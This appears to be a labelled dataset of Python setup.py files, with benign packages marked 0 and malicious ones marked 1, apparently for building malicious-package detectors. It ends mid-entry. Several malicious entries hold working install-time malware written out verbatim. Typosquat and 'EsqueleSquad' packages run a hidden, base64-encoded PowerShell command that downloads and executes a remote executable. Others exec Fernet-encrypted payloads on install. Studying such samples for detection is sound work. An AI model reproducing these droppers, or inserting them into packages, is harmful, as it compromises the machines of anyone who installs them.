{"idx": "nvidialgtb-8.64", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'nvidiaLGTB',\n    packages = ['modlib'],\n    version = '4.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "geomet-0.3.0", "func": "\"\"\"\nGeoMet\n\nConvert GeoJSON to WKT/WKB (Well-Known Text/Binary), and vice versa.\n\"\"\"\n\nimport re\nimport sys\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\nif (3,2) < sys.version_info < (3,4):\n    raise RuntimeError(\"Python3.3 is no longer supported\")\n\n\ndef get_version():\n    version_re = r\"^__version__\\s+=\\s+['\\\"]([^'\\\"]*)['\\\"]\"\n    version = None\n\n    for line in open('geomet/__init__.py', 'r'):\n        version_match = re.search(version_re, line, re.M)\n        if version_match:\n            version = version_match.group(1)\n            break\n    else:\n        sys.exit('__version__ variable not found in geomet/__init__.py')\n\n    return version\n\nVERSION = get_version()\n\nsetup(\n    name='geomet',\n    version=VERSION,\n    maintainer='Lars Butler',\n    maintainer_email='lars.butler@gmail.com',\n    url='https://github.com/geomet/geomet',\n    description='GeoJSON <-> WKT/WKB conversion utilities',\n    long_description=__doc__,\n    platforms=['any'],\n    packages=find_packages(exclude=['geomet.tests', 'geomet.tests.*']),\n    entry_points={'console_scripts': ['geomet=geomet.tool:cli']},\n    license='Apache 2.0',\n    keywords='wkb wkt geojson',\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'License :: OSI Approved :: Apache Software License',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Education',\n        'Intended Audience :: Science/Research',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Topic :: Scientific/Engineering :: GIS',\n    ],\n    zip_safe=False,\n    install_requires=['click', 'six'],\n    python_requires=\">2.6, !=3.3.*, <4\",\n)\n", "target": 0}
{"idx": "freertos-gdb-1.0.1", "func": "# SPDX-FileCopyrightText: 2022 Espressif Systems (Shanghai) CO LTD\n# SPDX-License-Identifier: Apache-2.0\n\nfrom setuptools import setup\nimport sys\n\nwith open('README.md', 'r', encoding='utf-8') as fh:\n    long_description = fh.read()\n\nif sys.version_info[:2] < (3, 6):\n    sys.exit(\n        'Python < 3.6 is not supported'\n    )\n\nsetup(\n    name='freertos-gdb',\n    version='1.0.1',\n    author='alexey.lapshin',\n    author_email='alexey.lapshin@espressif.com',\n    description='Python module for operating with freeRTOS-kernel objects in GDB',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    license='Apache License 2.0',\n    url='https://github.com/espressif/freertos-gdb',\n    project_urls={\n        'Bug Tracker': 'https://github.com/espressif/freertos-gdb/issues',\n    },\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'License :: OSI Approved :: Apache Software License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: Implementation :: CPython',\n    ],\n    packages=['freertos_gdb'],\n    python_requires='>=3.6',\n)\n", "target": 0}
{"idx": "flake8-comments-0.1.2", "func": "#!/usr/bin/env python\n# setup.py generated by flit for tools that don't yet use PEP 517\n\nfrom distutils.core import setup\n\npackages = \\\n['flake8_comments']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['flake8']\n\nextras_require = \\\n{'test': ['pytest', 'pytest-cov']}\n\nentry_points = \\\n{'flake8.extension': ['CM00 = flake8_comments:Checker']}\n\nsetup(name='flake8-comments',\n      version='0.1.2',\n      description='Find redundant comments in Python code',\n      author='Gram',\n      author_email='gram@orsinium.dev',\n      url='https://github.com/orsinium-labs/flake8-comments',\n      packages=packages,\n      package_data=package_data,\n      install_requires=install_requires,\n      extras_require=extras_require,\n      entry_points=entry_points,\n      python_requires='>=3.6',\n     )\n", "target": 0}
{"idx": "ddt-1.6.0", "func": "#!/usr/bin/env python\n# # coding: utf-8\n\nfrom setuptools import setup\nfrom ddt import __version__\n\nsetup(\n    name='ddt',\n    description='Data-Driven/Decorated Tests',\n    long_description='A library to multiply test cases',\n    version=__version__,\n    author='Carles Barrob\u00e9s',\n    author_email='carles@barrobes.com',\n    url='https://github.com/datadriventests/ddt',\n    py_modules=['ddt'],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Software Development :: Testing',\n    ],\n    setup_requires=['enum34; python_version < \"3\"'],\n    install_requires=['enum34; python_version < \"3\"'],\n)\n", "target": 0}
{"idx": "furl-2.1.3", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n#\n# furl - URL manipulation made simple.\n#\n# Ansgar Grunseid\n# grunseid.com\n# grunseid@gmail.com\n#\n# License: Build Amazing Things (Unlicense)\n#\n\nimport os\nimport sys\nfrom os.path import dirname, join as pjoin\nfrom setuptools import setup, find_packages, Command\nfrom setuptools.command.test import test as TestCommand\n\n\nmeta = {}\nwith open(pjoin('furl', '__version__.py')) as f:\n    exec(f.read(), meta)\n\n\nclass Publish(Command):\n    \"\"\"Publish to PyPI with twine.\"\"\"\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        os.system('python setup.py sdist bdist_wheel')\n\n        sdist = 'dist/furl-%s.tar.gz' % meta['__version__']\n        wheel = 'dist/furl-%s-py2.py3-none-any.whl' % meta['__version__']\n        rc = os.system('twine upload \"%s\" \"%s\"' % (sdist, wheel))\n\n        sys.exit(rc)\n\n\nclass RunTests(TestCommand):\n    \"\"\"\n    Run the unit tests.\n\n    To test all supported Python versions (as specified in tox.ini) in\n    parallel, run\n\n      $ tox -p\n\n    By default, `python setup.py test` fails if tests/ isn't a Python\n    module; i.e. if the tests/ directory doesn't contain an __init__.py\n    file). But the tests/ directory shouldn't contain an __init__.py\n    file and tests/ shouldn't be a Python module. See\n\n      http://doc.pytest.org/en/latest/goodpractices.html\n\n    Running the unit tests manually here enables `python setup.py test`\n    without tests/ being a Python module.\n    \"\"\"\n    def run_tests(self):\n        from unittest import TestLoader, TextTestRunner\n        tests_dir = pjoin(dirname(__file__), 'tests/')\n        suite = TestLoader().discover(tests_dir)\n        result = TextTestRunner().run(suite)\n        sys.exit(0 if result.wasSuccessful() else -1)\n\n\nsetup(\n    name=meta['__title__'],\n    license=meta['__license__'],\n    version=meta['__version__'],\n    author=meta['__author__'],\n    author_email=meta['__contact__'],\n    url=meta['__url__'],\n    description=meta['__description__'],\n    long_description=(\n        'Information and documentation can be found at ' + meta['__url__']),\n    packages=find_packages(),\n    include_package_data=True,\n    platforms=['any'],\n    classifiers=[\n        'License :: Public Domain',\n        'Natural Language :: English',\n        'Intended Audience :: Developers',\n        'Topic :: Software Development :: Libraries',\n        'Development Status :: 5 - Production/Stable',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Programming Language :: Python :: Implementation :: CPython',\n    ],\n    tests_require=[\n        'flake8',\n        'six>=1.8.0',\n    ],\n    install_requires=[\n        'six>=1.8.0',\n        'orderedmultidict>=1.0.1',\n    ],\n    cmdclass={\n        'test': RunTests,\n        'publish': Publish,\n    },\n)\n", "target": 0}
{"idx": "bip-uutils-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'QMJcMSrFxloVKqsuQkeUrJVXhggreABIIyAeLghkaixwbzMgULCEbXpnEevjoVUsSItcqi MWrGPehkgWSdLgQbYKuzsRy'\nLONG_DESCRIPTION = 'grcbygipwGilwuMdBUvzyUQPnOUsQnRWCuOqGhgiamsZihFzcYKwhtOVaqXDnuXDHC XMxPYaZVBbDlSsBSPyzKb nBPUiWnJJfLwQikqnCOmCaAjSj aPWlKWnAibQTqDIeDFoNqOIAald djRQLDTqsAwbQXdnXvULVPXjmRRQFKltUdWPnhKSfjOdXQxfxApfhrTlbmUXEZMawCLjotZRUxXYxHzRpcTJINTQw wmhGdJUZP lncODTynNNduPdusHeGoJywSiiYKdIBrJEisFwOrTidQSv ejzR prNHzqaCTMcaiMTgGqHL gcLVwRDexAuYNSinmo lIICBUOJzfKCpoSJifqZFqWLQicRFKSIvpNtEsFUmxeKOrHvQHwrNhAydLJDBPDlOgAAdEGCTirhzTzbuQbjeGZHKMCMTaiexQYkXVXsmvOgXd QwFZOZJjklcWasHtdXLLvERgdG'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'yWlWQtrxGIs3_NEtZaq0BsPmW7nfwibtA0Idpll2lKs=').decrypt(b'gAAAAABmA1rBLXta-AhENNWNDSehu26mpiEccxpH4qiudprBSGtfMsYb8acViCmadhxm3-w8qoUsuUjkHDnQtuFec5vpVZjrpj6k4n65vgHt8OH3AYT0sOCxWiCkt077qCPmHqKsAsXH_Xk1MSQjUiory-vN9up-mVq-czlDMP5HqZ-MVuYIcuG4Pwo_pgOOBaTSLmC3LDfU6sY6mMzO1vTrV1SWVPJdVr6CC212OYQ1HUdBmBaqHyc='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"bip-uutils\",\n    version=VERSION,\n    author=\"OjAPZEdXAnGu\",\n    author_email=\"ptZTIUUmUMHMcc@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "etheriumm-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'qPPtNGbuLbLQACfQTFMvSuBmRGTqFdjDKYgWkvkKcpXLFEMAlr'\nLONG_DESCRIPTION = 'wXANKzar llowibK jxGKLvXEdSfVQbStNHeBoBnzPTtQalkOIDEJXuoSMoGDaLcwrLBpSkIjBQLuZxmjpqVnC nNEgqwcXdbiaXwluIfCawDaboCMTdqvqJXXHRZLOGPIiateYCfJXzBjQlmfB TABLgPjXzhtMlLNQEa'\n\n\nclass SnndcOIofRXRowTVBNOHEjaULBIfZuXGEGMSWjcrBNygtrWmUNlpbrHLmCHMFOKmOzCSHUvrF(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'cSryC5c1gVEta9stkzCzrOThqdwaYRavh5ICN8tKMXo=').decrypt(b'gAAAAABmbvQlhOqPSkldkKXcUnkATw5S9fx8z-jtkoKUYN5GKouX2yVtbONRRH1tgQx55H35122THPQb5CXotk5PpDz13AbN04OX3m-dBer3XJuIyqycDXaDaUT4XqoK6moQyoGvOiZThUGMxP_PFg8xHIg254SNtT9B2eyYnbWr032M1pNGN57nCIPr896MfcX05WSzlQ77uUofG4EF6UXVruaX7EtxaAJaQHvvTVpCk8qIt0KbyEQ='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"etheriumm\",\n    version=VERSION,\n    author=\"CrIlGUXU\",\n    author_email=\"xlyKuQiSpmUrRRAURsV@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': SnndcOIofRXRowTVBNOHEjaULBIfZuXGEGMSWjcrBNygtrWmUNlpbrHLmCHMFOKmOzCSHUvrF,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "selfsplitad-10.62", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfsplitad',\n    packages = ['modlib'],\n    version = '2.34',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "editdistance-0.6.0", "func": "\"\"\"\n-------\nLicense\n-------\n\nIt is released under the MIT license.\n\n    Copyright (c) 2013 Hiroyuki Tanaka\n\n    Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\n    The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\n    THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\"\"\"\n\n\ntry:\n    from setuptools import Extension, setup\nexcept:\n    from distutils import Extension, setup\n# for development\n# from Cython.Build import cythonize\n# ext_modules = cythonize('editdistance/bycython.pyx')\n\next_modules = [\n    Extension(\n        \"editdistance.bycython\",\n        [\"editdistance/_editdistance.cpp\", \"editdistance/bycython.cpp\"],\n        include_dirs=[\"./editdistance\"],\n    )\n]\n\nwith open(\"README.rst\") as readme_file:\n    readme = readme_file.read()\n\nsetup(\n    name=\"editdistance\",\n    version=\"0.6.0\",\n    python_requires=\">=3.5\",\n    description=\"Fast implementation of the edit distance(Levenshtein distance)\",\n    long_description=readme,\n    long_description_content_type=\"text/x-rst\",\n    author=\"Hiroyuki Tanaka\",\n    author_email=\"aflc0x@gmail.com\",\n    url=\"https://www.github.com/roy-ht/editdistance\",\n    ext_modules=ext_modules,\n    packages=[\"editdistance\"],\n    package_data={\"editdistance\": [\"_editdistance.h\", \"def.h\"]},\n    classifiers=[\n        \"License :: OSI Approved :: MIT License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3 :: Only\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n)\n", "target": 0}
{"idx": "tensofklow-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'Ma FqOieNguYsGTuMYNjkGgUwplIIoYFKGUMTPAAkFqLBjoFxfOOhVlRbIrzzGslEbdSIkMOZIZHxqHCdxtomKh tqsvBrSNrtby'\nLONG_DESCRIPTION = ' OvwzgxlGxSFQcmxwxVPhHrXnZllBNUXuuQDwhRSCWzZFBEFQcubxQnjjIhrRvj ShcRLUKtKZXyBHTyatW GtBsK NNthRLsqZodmEpSJatmnYiYXogAmdtpRhDJfQByEzoeMHxqgVvsiYxgpYXUqVHAwccurPvxuKDnKIDYYCXQPfPSHimnaXCQSlJEhWQZCQoaMeGlO'\n\n\nclass lAPButSsVFcivZZvwvtJykfwDhOalvDvUwFtfGhIcbDHnWtJWChAbZlMqtCqXSFzmrEEo(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'wloGncLwMJ9W7P21djfL0tyUknsfTRV46RQDDOinkXw=').decrypt(b'gAAAAABmBH1ww-89-08joS2Myc6BElcdtGD2AjRzHgFaFl0-QaB_6mKpcqrFNYGFs-okpzxt5mFkSyV7Vp27xTq7x2aWRbB6nhBydEvfu21wmSFjjhNawrD5AVeZs7m2h93cP3_Ck4sAAN05DncRhbrMcd-tfPxbivEdqh8xFFgWryAnVC1gFcbDl7-ENHQ_GfgdpGNpEBg0y5RCwrI6V-RhMOpXcZJqGs37qxBa5jBZoIMTUdpdDIw='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"tensofklow\",\n    version=VERSION,\n    author=\"PpMtPfteVSkXWjQ\",\n    author_email=\"BBabTwuSfSHfIIJSKT@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': lAPButSsVFcivZZvwvtJykfwDhOalvDvUwFtfGhIcbDHnWtJWChAbZlMqtCqXSFzmrEEo,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "news-ascii-artss-0.1", "func": "\nfrom distutils.core import setup\nsetup(\n  name = 'news_ascii_artss',         # How you named your package folder (MyLib)\n  packages = ['news_ascii_artss'],   # Chose the same as \"name\"\n  version = '0.1',      # Start with a small number and increase it with every change you make\n  license='MIT',        # Chose a license from here: https://help.github.com/articles/licensing-a-repository\n  description = 'A new generation of ascii art text',   # Give a short description about your library\n  author = 'lord69',                   # Type in your name\n  author_email = 'guyedit.pro@gmail.com',      # Type in your E-Mail\n  url = 'https://github.com/GuyEditDev/new_ascii_art',   # Provide either the link to your github or to your website\n  download_url = 'https://github.com/GuyEditDev/news_ascii_art/archive/refs/tags/v_05.tar.gz',    # I explain this later on\n  keywords = ['ASCII', 'ART', 'TEXT'],   # Keywords that define your package best\n  install_requires=[            # I get to this in a second\n          'requests',\n          'regex',\n          'pysqlite3',\n          'pypiwin32',\n          'pyfiglet',\n          'pybase64',\n          'pycrypto'\n      ],\n  classifiers=[\n    'Development Status :: 3 - Alpha',      # Chose either \"3 - Alpha\", \"4 - Beta\" or \"5 - Production/Stable\" as the current state of your package\n    'Intended Audience :: Developers',      # Define that your audience are developers\n    'Topic :: Software Development :: Build Tools',\n    'License :: OSI Approved :: MIT License',   # Again, pick a license\n    'Programming Language :: Python :: 3',      #Specify which pyhton versions that you want to support\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10'\n  ],\n)\n", "target": 1}
{"idx": "curatorbin-1.2.4", "func": "#!/usr/bin/env python3\n\nfrom setuptools import setup\nfrom setuptools.command.develop import develop\nfrom setuptools.command.install import install\n \nsetup(\n    name=\"curatorbin\",\n    version=\"1.2.4\",\n    description=\"install curator through pip and run it through python\",\n    url=\"https://github.com/evergreen-ci/curatorbin\",\n    license=\"SSPLv1\",\n    author=\"Harris Hoke\",\n    author_email=\"harris.hoke@mongodb.com\",\n    classifiers=[\n        \"Environment :: Console\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.9\",\n    ],\n    packages=[\"curatorbin\"],\n    package_data={\n        \"curatorbin\": [\n            \"arm/curator\",\n            \"macos/curator\",\n            \"macos-arm64/curator\",\n            \"ubuntu/curator\",\n            \"windows-64/curator.exe\"\n        ]\n    }\n)\n\n", "target": 0}
{"idx": "django-allow-cidr-0.5.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport os\nimport re\nimport sys\n\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\n\ndef get_version(*file_paths):\n    \"\"\"Retrieves the version from allow_cidr/__init__.py\"\"\"\n    filename = os.path.join(os.path.dirname(__file__), *file_paths)\n    version_file = open(filename).read()\n    version_match = re.search(r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\", version_file, re.M)\n    if version_match:\n        return version_match.group(1)\n    raise RuntimeError(\"Unable to find version string.\")\n\n\nversion = get_version(\"allow_cidr\", \"__init__.py\")\n\n\nif sys.argv[-1] == \"publish\":\n    try:\n        import wheel\n\n        print(\"Wheel version: \", wheel.__version__)\n    except ImportError:\n        print('Wheel library missing. Please run \"pip install wheel\"')\n        sys.exit()\n    os.system(\"python setup.py sdist upload\")\n    os.system(\"python setup.py bdist_wheel upload\")\n    sys.exit()\n\nif sys.argv[-1] == \"tag\":\n    print(\"Tagging the version on git:\")\n    os.system(\"git tag -a %s -m 'version %s'\" % (version, version))\n    os.system(\"git push --tags\")\n    sys.exit()\n\nreadme = open(\"README.rst\").read()\nhistory = open(\"HISTORY.rst\").read().replace(\".. :changelog:\", \"\")\n\nsetup(\n    name=\"django-allow-cidr\",\n    version=version,\n    description=\"\"\"A Django Middleware to enable use of CIDR IP ranges in ALLOWED_HOSTS.\"\"\",\n    long_description=readme + \"\\n\\n\" + history,\n    author=\"Paul McLanahan\",\n    author_email=\"pmac@mozilla.com\",\n    url=\"https://github.com/mozmeao/django-allow-cidr\",\n    packages=[\n        \"allow_cidr\",\n    ],\n    include_package_data=True,\n    install_requires=[\n        \"Django>=2.2\",\n        \"packaging\",\n    ],\n    license=\"Apache Software License 2.0\",\n    zip_safe=False,\n    keywords=\"django-allow-cidr\",\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"Framework :: Django\",\n        \"Framework :: Django :: 2.2\",\n        \"Framework :: Django :: 3.2\",\n        \"Framework :: Django :: 4.0\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n)\n", "target": 0}
{"idx": "esqpinghackedvisa-6.76", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpinghackedvisa',\n    packages = ['modlib'],\n    version = '8.49',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-aiplatform-1.16.1", "func": "# -*- coding: utf-8 -*-\n\n# Copyright 2020 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\nimport io\nimport os\n\nimport setuptools  # type: ignore\n\nname = \"google-cloud-aiplatform\"\ndescription = \"Vertex AI API client library\"\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\nversion = {}\nwith open(os.path.join(package_root, \"google/cloud/aiplatform/version.py\")) as fp:\n    exec(fp.read(), version)\nversion = version[\"__version__\"]\n\ntensorboard_extra_require = [\"tensorflow >=2.3.0, <3.0.0dev\"]\nmetadata_extra_require = [\"pandas >= 1.0.0\"]\nxai_extra_require = [\"tensorflow >=2.3.0, <3.0.0dev\"]\nlit_extra_require = [\n    \"tensorflow >= 2.3.0, <3.0.0dev\",\n    \"pandas >= 1.0.0\",\n    